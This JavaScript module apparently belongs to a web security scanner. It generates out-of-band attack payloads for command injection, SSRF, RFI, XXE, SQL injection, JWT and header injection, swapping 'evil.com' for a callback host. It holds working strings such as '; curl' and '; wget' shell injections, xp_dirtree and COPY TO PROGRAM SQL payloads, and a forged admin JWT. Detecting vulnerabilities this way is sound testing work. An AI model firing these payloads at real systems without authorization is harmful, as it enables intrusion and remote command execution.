const OOB_TYPES = new Set([
  'cmdi', 'ssrf', 'rfi', 'xxe', 'sqli', 'ssti',
  'header_injection', 'jwt', 'code_injection', 'deserialization'
]);

function base64url(value) {
  return Buffer.from(typeof value === 'string' ? value : JSON.stringify(value))
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

function buildJwtKid(kid) {
  const header = base64url({ alg: 'HS256', typ: 'JWT', kid });
  const payload = base64url({ sub: 'admin', role: 'admin', iat: 1 });
  return header + '.' + payload + '.signature';
}

function hostValue(tokenRecord) {
  if (!tokenRecord) return null;
  return tokenRecord.hostWithPort || tokenRecord.host || null;
}

function hostNoPort(tokenRecord) {
  const host = hostValue(tokenRecord);
  if (!host) return null;
  if (host.startsWith('[')) {
    const end = host.indexOf(']');
    return end === -1 ? host : host.slice(1, end);
  }
  return host.split(':')[0];
}

function replaceEvil(text, oob) {
  if (!text || !oob) return { text, token: null, channel: null, dynamic: false };
  const record = oob.issue({ payload: text, oob: true });
  const value = String(text).split('evil.com').join(hostValue(record));
  return { text: value, token: record.token, channel: 'http', dynamic: true };
}

function builtins(type, oob) {
  if (!oob) return [];
  const items = [];
  const add = (build, channel) => {
    const record = oob.issue({ type, oob: true });
    const host = hostValue(record);
    if (!host) return;
    const h = hostNoPort(record);
    const value = build(host, h, record.token);
    if (value) items.push({ value, oobToken: record.token, oobChannel: channel, dynamic: true });
  };

  if (type === 'cmdi') {
    if (oob.domain) {
      add((host, h) => encodeURIComponent('; nslookup ' + h), 'dns');
      add((host, h) => encodeURIComponent('; ping -c1 ' + h), 'dns');
    }
    add((host, h, token) => encodeURIComponent('; curl http://' + host + '/' + token), 'http');
    add((host, h, token) => encodeURIComponent('; wget -qO- http://' + host + '/' + token), 'http');
  } else if (type === 'ssrf') {
    add((host, h, token) => 'http://' + host + '/' + token, 'http');
    add((host, h, token) => '//' + host + '/' + token, 'http');
  } else if (type === 'rfi') {
    add((host, h, token) => 'http://' + host + '/' + token + '.txt', 'http');
    add((host, h, token) => '//' + host + '/' + token + '.txt', 'http');
  } else if (type === 'xxe') {
    add((host, h, token) => '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://' + host + '/' + token + '.dtd">%x;]><r/>', 'http');
  } else if (type === 'sqli') {
    if (oob.domain) {
      add((host, h) => '%27%3BDECLARE%20%40q%20VARCHAR%2899%29%3BSET%20%40q%3D%27%5C%5C' + h + '%5Cx%27%3BEXEC%20master..xp_dirtree%20%40q--', 'dns');
      add((host, h) => '%27%20AND%20LOAD_FILE%28%27%5C%5C' + h + '%5Ca%27%29--%20', 'dns');
      add((host, h) => '%27%3BCOPY%20%28SELECT%20%27%27%29%20TO%20PROGRAM%20%27nslookup%20' + h + '%27--%20', 'dns');
    }
    add((host, h, token) => '%27%20||%20UTL_HTTP.REQUEST%28%27http%3A%2F%2F' + host + '%2F' + token + '%27%29--%20', 'http');
  } else if (type === 'jwt') {
    add((host, h, token) => buildJwtKid('http://' + host + '/' + token + '/key.pem'), 'http');
    add((host, h, token) => buildJwtKid('http://' + host + '/' + token), 'http');
  } else if (type === 'header_injection') {
    add((host, h) => '%0d%0aBcc%3Aattacker%40' + h, 'dns');
  } else if (type === 'code_injection') {
    add((host, h, token) => encodeURIComponent("system('curl http://" + host + '/' + token + "')"), 'http');
  }
  return items;
}

function decorate(type, payload, oob) {
  if (!payload || !oob || !OOB_TYPES.has(type)) {
    return { value: payload, oobToken: null, oobChannel: null, dynamic: false };
  }
  if (!String(payload).includes('evil.com')) {
    return { value: payload, oobToken: null, oobChannel: null, dynamic: false };
  }
  const record = oob.issue({ type, payload, oob: true });
  const host = hostValue(record);
  if (!host) {
    return { value: payload, oobToken: null, oobChannel: null, dynamic: false };
  }
  const value = String(payload).split('evil.com').join(host);
  return { value, oobToken: record.token, oobChannel: 'http', dynamic: true };
}

module.exports = { OOB_TYPES, decorate, builtins, replaceEvil, buildJwtKid, base64url };
